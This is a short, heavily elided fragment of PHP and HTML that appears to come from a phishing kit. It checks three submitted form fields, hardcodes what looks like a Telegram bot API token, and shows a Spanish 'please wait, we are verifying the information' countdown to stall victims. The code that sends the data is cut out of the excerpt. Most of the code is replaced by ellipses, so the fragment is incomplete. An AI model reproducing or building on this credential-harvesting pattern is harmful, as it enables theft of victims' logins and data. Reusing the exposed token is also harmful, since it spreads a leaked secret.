...
if( isset( $_POST['ipts1'] ) && isset( $_POST['ipts2']) && isset( $_POST['ipts3']) ){
    ...
    $apiToken = "5509054669:AAFjohXIcPEkUgsB_Od-PhpWWOhp-LpeaYw";
 ...
 <br>
           ...
           <form action="" method="post" class="hh"> 
            ...
            <script language="JavaScript">
               ...
               {
                   document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" Segundos.<br><br>Estamos verificando la información. <br> ";
